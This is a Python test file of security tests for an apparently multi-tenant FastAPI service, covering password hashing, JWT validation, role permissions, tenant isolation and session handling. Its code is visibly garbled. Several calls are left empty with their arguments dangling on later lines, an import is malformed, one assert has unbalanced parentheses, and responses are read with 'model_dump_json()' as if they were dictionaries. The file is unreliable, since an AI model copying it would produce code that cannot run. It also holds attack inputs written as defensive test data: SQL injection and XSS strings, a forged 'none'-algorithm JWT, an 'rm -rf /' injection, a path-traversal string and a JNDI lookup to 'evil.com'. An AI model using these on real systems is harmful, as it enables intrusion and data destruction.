"""
Security tests for authentication, authorization, and data protection.
"""

import pytest
import jwt
from datetime import datetime, timedelta
from uuid import uuid4

from fastapi.testclient import TestClient
from fastapi import HTTPException

from app.core.security import ()
    create_access_token, create_refresh_token, decode_token,
    verify_password, get_password_hash, check_permission, 
    check_tenant_access, CurrentUser, UserRole, Permission
, timezone)


@pytest.mark.unit
class TestPasswordSecurity:
    """Test password hashing and verification."""
    
    def test_password_hashing(self):
        """Test password hashing is secure."""
        password = "SecurePassword123!"
        hashed = get_password_hash(password)
        
        # Hash should be different from original
        assert hashed != password
        # Hash should be non-empty
        assert len(hashed) > 0
        # Should contain bcrypt identifier
        assert hashed.startswith("$2b$")
    
    def test_password_verification_success(self):
        """Test successful password verification."""
        password = "SecurePassword123!"
        hashed = get_password_hash(password)
        
        assert verify_password(password, hashed) is True
    
    def test_password_verification_failure(self):
        """Test password verification with wrong password."""
        password = "SecurePassword123!"
        wrong_password = "WrongPassword456!"
        hashed = get_password_hash(password)
        
        assert verify_password(wrong_password, hashed) is False
    
    def test_empty_password_handling(self):
        """Test handling of empty passwords."""
        with pytest.raises(Exception):
            get_password_hash("")
    
    def test_password_hash_uniqueness(self):
        """Test that same password generates different hashes."""
        password = "SecurePassword123!"
        hash1 = get_password_hash(password)
        hash2 = get_password_hash(password)
        
        # Due to salt, hashes should be different
        assert hash1 != hash2
        # But both should verify correctly
        assert verify_password(password, hash1) is True
        assert verify_password(password, hash2) is True


@pytest.mark.unit
class TestJWTSecurity:
    """Test JWT token security."""
    
    def test_access_token_creation(self):
        """Test access token creation."""
        data = {
            "user_id": str(uuid4()),
            "email": "test@example.com",
            "role": "tenant_user"
        }
        
        token = create_access_token(data)
        
        assert isinstance(token, str)
        assert len(token) > 0
        
        # Decode and verify
        payload = decode_token(token)
        assert payload["user_id"] == data["user_id"]
        assert payload["email"] == data["email"]
        assert payload["role"] == data["role"]
        assert payload["type"] == "access"
    
    def test_refresh_token_creation(self):
        """Test refresh token creation."""
        data = {
            "user_id": str(uuid4()),
            "email": "test@example.com"
        }
        
        token = create_refresh_token(data)
        payload = decode_token(token)
        
        assert payload["type"] == "refresh"
        assert payload["user_id"] == data["user_id"]
    
    def test_token_expiration(self):
        """Test token expiration handling."""
        data = {"user_id": str(uuid4())}
        
        # Create token with immediate expiration
        expired_token = create_access_token()
            data, expires_delta=timedelta(seconds=-1)
        )
        
        # Should raise exception when decoding expired token
        with pytest.raises(HTTPException) as exc_info:
            decode_token(expired_token)
        
        assert exc_info.value.status_code == 401
        assert "expired" in str(exc_info.value.detail).lower()
    
    def test_invalid_token(self):
        """Test invalid token handling."""
        invalid_token = "invalid.token.here"
        
        with pytest.raises(HTTPException) as exc_info:
            decode_token(invalid_token)
        
        assert exc_info.value.status_code == 401
        assert "invalid" in str(exc_info.value.detail).lower()
    
    def test_token_tampering_detection(self):
        """Test detection of tampered tokens."""
        data = {"user_id": str(uuid4())}
        token = create_access_token(data)
        
        # Tamper with token by changing last character
        tampered_token = token[:-1] + "X"
        
        with pytest.raises(HTTPException) as exc_info:
            decode_token(tampered_token)
        
        assert exc_info.value.status_code == 401
    
    def test_token_custom_expiration(self):
        """Test custom token expiration."""
        data = {"user_id": str(uuid4())}
        custom_expiry = timedelta(hours=2)
        
        token = create_access_token(data, expires_delta=custom_expiry)
        payload = decode_token(token)
        
        # Check expiration is approximately 2 hours from now
        exp_time = datetime.fromtimestamp(payload["exp"])
        expected_exp = datetime.now(timezone.utc) + custom_expiry
        
        # Allow 1 minute tolerance
        assert abs((exp_time - expected_exp).total_seconds() < 60


@pytest.mark.unit
class TestRoleBasedAccessControl:
    """Test RBAC permissions."""
    
    def test_master_admin_permissions(self):
        """Test master admin has all permissions."""
        role = UserRole.MASTER_ADMIN
        
        # Should have management permissions
        assert check_permission(role, Permission.MANAGE_ALL_TENANTS) is True
        assert check_permission(role, Permission.MANAGE_ALL_BILLING) is True
        assert check_permission(role, Permission.SYSTEM_ADMIN) is True
        assert check_permission(role, Permission.BILLING_WRITE) is True
        assert check_permission(role, Permission.DEPLOYMENT_WRITE) is True
    
    def test_tenant_admin_permissions(self):
        """Test tenant admin permissions."""
        role = UserRole.TENANT_ADMIN
        
        # Should have tenant-level permissions
        assert check_permission(role, Permission.READ_TENANT) is True
        assert check_permission(role, Permission.UPDATE_TENANT) is True
        assert check_permission(role, Permission.BILLING_READ) is True
        assert check_permission(role, Permission.DEPLOYMENT_READ) is True
        
        # Should NOT have system-wide permissions
        assert check_permission(role, Permission.MANAGE_ALL_TENANTS) is False
        assert check_permission(role, Permission.SYSTEM_ADMIN) is False
    
    def test_tenant_user_permissions(self):
        """Test tenant user permissions."""
        role = UserRole.TENANT_USER
        
        # Should have read-only permissions
        assert check_permission(role, Permission.READ_TENANT) is True
        assert check_permission(role, Permission.BILLING_READ) is True
        assert check_permission(role, Permission.DEPLOYMENT_READ) is True
        
        # Should NOT have write permissions
        assert check_permission(role, Permission.UPDATE_TENANT) is False
        assert check_permission(role, Permission.BILLING_WRITE) is False
        assert check_permission(role, Permission.DEPLOYMENT_WRITE) is False
    
    def test_reseller_permissions(self):
        """Test reseller permissions."""
        role = UserRole.RESELLER
        
        # Should have tenant creation permissions
        assert check_permission(role, Permission.CREATE_TENANT) is True
        assert check_permission(role, Permission.CREATE_SUBSCRIPTION) is True
        assert check_permission(role, Permission.READ_BILLING) is True
        
        # Should NOT have management permissions
        assert check_permission(role, Permission.MANAGE_ALL_TENANTS) is False
        assert check_permission(role, Permission.SYSTEM_ADMIN) is False
    
    def test_support_permissions(self):
        """Test support permissions."""
        role = UserRole.SUPPORT
        
        # Should have read-only access
        assert check_permission(role, Permission.READ_TENANT) is True
        assert check_permission(role, Permission.READ_BILLING) is True
        assert check_permission(role, Permission.READ_DEPLOYMENT) is True
        
        # Should NOT have write permissions
        assert check_permission(role, Permission.UPDATE_TENANT) is False
        assert check_permission(role, Permission.BILLING_WRITE) is False
        assert check_permission(role, Permission.DELETE_TENANT) is False


@pytest.mark.unit
class TestTenantIsolation:
    """Test tenant data isolation."""
    
    def test_tenant_access_validation(self):
        """Test tenant access validation."""
        tenant_id_a = str(uuid4())
        tenant_id_b = str(uuid4())
        
        # Tenant user should only access their own tenant
        assert check_tenant_access(tenant_id_a, tenant_id_a, UserRole.TENANT_USER) is True
        assert check_tenant_access(tenant_id_a, tenant_id_b, UserRole.TENANT_USER) is False
        
        # Master admin should access any tenant
        assert check_tenant_access(None, tenant_id_a, UserRole.MASTER_ADMIN) is True
        assert check_tenant_access(None, tenant_id_b, UserRole.MASTER_ADMIN) is True
    
    def test_current_user_tenant_access(self):
        """Test CurrentUser tenant access methods."""
        tenant_id = str(uuid4())
        other_tenant_id = str(uuid4())
        
        # Tenant admin user
        tenant_admin = CurrentUser()
            user_id=str(uuid4()),
            email="admin@tenant.com",
            role=UserRole.TENANT_ADMIN,
            tenant_id=tenant_id
        )
        
        assert tenant_admin.can_access_tenant(tenant_id) is True
        assert tenant_admin.can_access_tenant(other_tenant_id) is False
        
        # Master admin user
        master_admin = CurrentUser()
            user_id=str(uuid4()),
            email="master@platform.com",
            role=UserRole.MASTER_ADMIN,
            tenant_id=None
        )
        
        assert master_admin.can_access_tenant(tenant_id) is True
        assert master_admin.can_access_tenant(other_tenant_id) is True
    
    def test_current_user_permissions(self):
        """Test CurrentUser permission checking."""
        user = CurrentUser()
            user_id=str(uuid4()),
            email="test@tenant.com",
            role=UserRole.TENANT_ADMIN,
            tenant_id=str(uuid4())
        )
        
        assert user.has_permission(Permission.READ_TENANT) is True
        assert user.has_permission(Permission.UPDATE_TENANT) is True
        assert user.has_permission(Permission.SYSTEM_ADMIN) is False


@pytest.mark.integration
class TestAPISecurityHeaders:
    """Test security headers in API responses."""
    
    def test_security_headers_present(self, client: TestClient):
        """Test that security headers are present."""
        response = client.get("/api/v1/health")
        
        # Check for security headers
        headers = response.headers
        
        # Content Security Policy
        assert "content-security-policy" in headers
        
        # Prevent MIME type sniffing
        assert headers.get("x-content-type-options") == "nosniff"
        
        # Frame protection
        assert headers.get("x-frame-options") == "DENY"
        
        # XSS protection
        assert headers.get("x-xss-protection") == "1; mode=block"
    
    def test_no_server_info_disclosure(self, client: TestClient):
        """Test that server information is not disclosed."""
        response = client.get("/api/v1/health")
        
        # Should not reveal server details
        assert "server" not in response.headers.keys()
        assert "x-powered-by" not in response.headers.keys()


@pytest.mark.integration
class TestAuthenticationBypass:
    """Test authentication bypass attempts."""
    
    def test_sql_injection_in_login(self, client: TestClient):
        """Test SQL injection attempts in login."""
        malicious_payloads = [
            "admin'--",
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users--"
        ]
        
        for payload in malicious_payloads:
            login_data = {
                "email": payload,
                "password": "password"
            }
            
            response = client.post("/api/v1/auth/login", json=login_data)
            
            # Should not succeed (either 401 or 422)
            assert response.status_code in [401, 422]
    
    def test_jwt_none_algorithm_attack(self):
        """Test JWT 'none' algorithm attack prevention."""
        # Create token with 'none' algorithm
        payload = {
            "user_id": str(uuid4()),
            "email": "attacker@example.com",
            "role": "master_admin"
        }
        
        # Manually create token with 'none' algorithm
        header = {"alg": "none", "typ": "JWT"}
        
        import json
        import base64
        
        header_encoded = base64.urlsafe_b64encode()
            json.dumps(header).encode()
        ).decode().rstrip("=")
        
        payload_encoded = base64.urlsafe_b64encode()
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        
        malicious_token = f"{header_encoded}.{payload_encoded}."
        
        # Should reject token with 'none' algorithm
        with pytest.raises(HTTPException):
            decode_token(malicious_token)
    
    def test_authorization_header_injection(self, client: TestClient):
        """Test authorization header injection attempts."""
        malicious_headers = [
            "Bearer \"; rm -rf /; \"",
            "Bearer <script>alert('xss')</script>",
            "Bearer ../../../etc/passwd",
            "Bearer ${jndi:ldap://evil.com/a}"
        ]
        
        for header in malicious_headers:
            response = client.get()
                "/api/v1/auth/me",
                headers={"Authorization": header}
            )
            
            # Should be unauthorized, not cause server error
            assert response.status_code in [401, 403, 422]


@pytest.mark.integration
class TestDataValidation:
    """Test input validation and sanitization."""
    
    def test_xss_prevention_in_user_input(self, client: TestClient, master_admin_token):
        """Test XSS prevention in user inputs."""
        headers = {"Authorization": f"Bearer {master_admin_token}"}
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'; DROP TABLE tenants; --"
        ]
        
        for payload in xss_payloads:
            tenant_data = {
                "name": f"test-{len(payload)}",
                "display_name": payload,
                "description": payload
            }
            
            response = client.post("/api/v1/tenants", json=tenant_data, headers=headers)
            
            if response.status_code == 201:
                # If created successfully, check response is sanitized
                data = response.model_dump_json()
                # Should not contain raw script tags
                assert "<script>" not in data.get("display_name", "")
                assert "<script>" not in data.get("description", "")
    
    def test_email_validation(self, client: TestClient, test_tenant, master_admin_token):
        """Test email validation."""
        headers = {"Authorization": f"Bearer {master_admin_token}"}
        
        invalid_emails = [
            "invalid-email",
            "@example.com",
            "test@",
            "test..test@example.com",
            "test@example..com"
        ]
        
        for email in invalid_emails:
            user_data = {
                "email": email,
                "password": "SecurePassword123!",
                "first_name": "Test",
                "last_name": "User"
            }
            
            response = client.post()
                f"/api/v1/tenants/{test_tenant.id}/users",
                json=user_data,
                headers=headers
            )
            
            # Should fail validation
            assert response.status_code == 422


@pytest.mark.integration
class TestSessionSecurity:
    """Test session and token security."""
    
    def test_token_reuse_prevention(self, client: TestClient, test_user):
        """Test that refresh tokens can only be used once."""
        # Login to get refresh token
        login_data = {
            "email": test_user.email,
            "password": "testpassword123"
        }
        
        response = client.post("/api/v1/auth/login", json=login_data)
        refresh_token = response.model_dump_json()["refresh_token"]
        
        # Use refresh token once
        refresh_data = {"refresh_token": refresh_token}
        response1 = client.post("/api/v1/auth/refresh", json=refresh_data)
        assert response1.status_code == 200
        
        # Try to use same refresh token again
        response2 = client.post("/api/v1/auth/refresh", json=refresh_data)
        assert response2.status_code == 401  # Should be rejected
    
    def test_concurrent_login_handling(self, client: TestClient, test_user):
        """Test handling of concurrent logins."""
        login_data = {
            "email": test_user.email,
            "password": "testpassword123"
        }
        
        # Multiple concurrent logins should all succeed
        responses = []
        for _ in range(3):
            response = client.post("/api/v1/auth/login", json=login_data)
            responses.append(response)
        
        # All should succeed (multiple active sessions allowed)
        for response in responses:
            assert response.status_code == 200
            assert "access_token" in response.model_dump_json()
    
    def test_logout_token_invalidation(self, client: TestClient, test_user):
        """Test that logout properly invalidates tokens."""
        # Login
        login_data = {
            "email": test_user.email,
            "password": "testpassword123"
        }
        
        response = client.post("/api/v1/auth/login", json=login_data)
        access_token = response.model_dump_json()["access_token"]
        
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Verify token works
        response = client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 200
        
        # Logout
        client.post("/api/v1/auth/logout", headers=headers)
        
        # Token should still work (stateless JWT)
        # In production, would implement token blacklist
        response = client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 200  # Still valid for stateless JWT